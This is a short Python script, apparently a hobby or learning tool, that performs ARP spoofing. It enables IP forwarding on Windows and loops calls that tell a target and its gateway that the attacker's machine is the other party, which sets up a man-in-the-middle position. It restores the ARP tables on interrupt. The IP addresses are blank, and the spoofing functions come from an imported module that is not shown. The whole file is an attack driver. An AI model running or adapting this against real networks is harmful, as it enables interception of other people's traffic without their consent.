from spoofing_services import *
import time


# if __name__ == "main":
target_ip = ""
gateway_ip = ""
enableIPRoute("Windows")

try:
    spoofer = Spoofer(con_mode="eth")
    while True:
        # spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
        spoofer.spoof(target_ip, gateway_ip)    # like to the target saying that the gateway's IP is a non-existent one
        spoofer.spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
        time.sleep(1)
except KeyboardInterrupt:
    print("Restoring the network, please wait...")
    spoofer.unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
    spoofer.unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is
    